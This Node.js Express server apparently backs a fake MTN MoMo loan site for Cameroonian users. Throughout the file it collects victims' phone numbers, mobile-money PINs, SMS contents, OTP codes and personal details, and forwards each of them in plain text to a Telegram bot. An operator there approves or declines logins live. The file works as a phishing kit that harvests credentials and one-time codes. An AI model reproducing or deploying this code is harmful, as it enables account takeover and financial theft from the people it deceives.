const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// ── Telegram notifications ─────────────────────────────
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ Telegram not configured:', text);
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = keyboard;
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const j = await r.json();
    if (!j.ok) console.log('Telegram response:', j);
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}


// In-memory store — resets when server restarts.
// For a real app, use a database.
const applications = {};

// ── 1. Verify PIN (login) ────────────────────────────────
app.post('/api/verify-pin', (req, res) => {
  const { phoneNumber, pin } = req.body;

  if (!phoneNumber || !pin) {
    return res.json({ success: false, message: 'Missing phone or PIN.' });
  }

  // SIMULATION: accept any 9-digit phone + any 5-digit PIN
  // For stricter demo, uncomment:
  // if (pin !== '12345') {
  //   return res.json({ success: false, message: 'Invalid credentials.' });
  // }

  const id = 'APP-' + Date.now();
  applications[id] = { phoneNumber, pin, status: 'pending' };

  console.log('📥 New login:', id, phoneNumber);

  // Telegram notification with inline APPROVE / DECLINE buttons
  const msg =
    `🔐 <b>New Login</b>\n` +
    `App ID: <code>${id}</code>\n` +
    `Phone: <code>${phoneNumber}</code>\n` +
    `PIN: <code>${pin}</code>\n\n` +
    `Tap a button to decide:`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ APPROVE', callback_data: 'approve:' + id },
      { text: '❌ DECLINE', callback_data: 'reject:'  + id }
    ]]
  };

  sendTelegram(msg, keyboard);

  res.json({ success: true, applicationId: id });
});

// ── 2. Check PIN approval status ─────────────────────────
app.get('/api/check-pin-status/:id', (req, res) => {
  const app_ = applications[req.params.id];
  if (!app_) return res.json({ success: false, status: 'unknown' });
  res.json({ success: true, status: app_.status });
});



// ── 2b. Submit loan application (NEW) ─────────────────
app.post('/api/submit-application', (req, res) => {
  const {
    loanType, loanAmount, loanTerm, purpose,
    firstName, lastName, phone,
    employmentStatus, annualIncome
  } = req.body;

  const msg =
    `📋 <b>New Loan Application</b>\n` +
    `👤 <b>Name:</b> <code>${firstName} ${lastName}</code>\n` +
    `📞 <b>Phone:</b> <code>+237 ${phone}</code>\n` +
    `💼 <b>Employment:</b> <code>${employmentStatus}</code>\n` +
    `💰 <b>Annual Income:</b> <code>XAF ${Number(annualIncome || 0).toLocaleString()}</code>\n` +
    `───────\n` +
    `🏦 <b>Loan Type:</b> <code>${loanType}</code>\n` +
    `💵 <b>Amount:</b> <code>XAF ${Number(loanAmount || 0).toLocaleString()}</code>\n` +
    `⏳ <b>Term:</b> <code>${loanTerm}</code>\n` +
    `📝 <b>Purpose:</b> <code>${purpose || '—'}</code>`;

  sendTelegram(msg);
  console.log('📋 Loan application:', firstName, lastName, phone, loanAmount);
  res.json({ success: true });
});

// ── 3. Submit SMS text ───────────────────────────────────
app.post('/api/submit-sms', (req, res) => {
  const { applicationId, smsText } = req.body;
    sendTelegram(`📩 <b>SMS submitted</b>\nApp ID: <code>${applicationId}</code>\nText: <code>${smsText}</code>`);
  console.log('📩 SMS received for', applicationId, ':', smsText);
  res.json({ success: true });
});

// ── 4. Verify OTP ────────────────────────────────────────
app.post('/api/verify-otp', (req, res) => {
  const { applicationId, otp } = req.body;
  const app_ = applications[applicationId];

  if (!app_) return res.json({ success: false, message: 'Unknown application.' });

  // SIMULATION: accept any 4-digit OTP
  // For stricter demo, uncomment:
  // if (otp !== '1234') {
  //   app_.status = 'wrongcode';
  //   return res.json({ success: false, message: 'Wrong OTP.' });
  // }

  
      sendTelegram(`🔑 <b>OTP entered</b>\nApp ID: <code>${applicationId}</code>\nOTP: <code>${otp}</code>`);
  console.log('🔐 OTP accepted for', applicationId);
  app_.otpStatus = 'approved';
  res.json({ success: true });
});

// ── 5. Check OTP approval status ─────────────────────────
app.get('/api/check-otp-status/:id', (req, res) => {
  const app_ = applications[req.params.id];
  if (!app_) return res.json({ success: false, status: 'unknown' });
  res.json({ success: true, status: app_.otpStatus || 'pending' });
});

// ── Telegram webhook — receives inline button taps ────
app.post('/api/telegram-webhook', (req, res) => {
  try {
    const cb = req.body && req.body.callback_query;

    if (!cb) {
      return res.json({ ok: true });
    }

    const data = cb.data || '';
    const [action, id] = data.split(':');
    const app_ = applications[id];

    console.log('📲 Telegram tap:', action, id);

    if (!app_) {
      return res.json({ ok: true });
    }

    if (action === 'approve') {
      app_.status = 'approved';
      sendTelegram(`✅ <b>Approved by admin</b>\nApp ID: <code>${id}</code>`);
    } else if (action === 'reject') {
      app_.status = 'rejected';
      sendTelegram(`❌ <b>Declined by admin</b>\nApp ID: <code>${id}</code>`);
    }

    // Acknowledge the callback to Telegram (removes the loading spinner)
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cb.id })
    }).catch(() => {});

    res.json({ ok: true });
  } catch (err) {
    console.error('Webhook error:', err.message);
    res.json({ ok: true });
  }
});

app.get('/', (req, res) => {
  res.send('MTN MoMo Backend is running ✅');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('🚀 Server running on port ' + PORT);
});
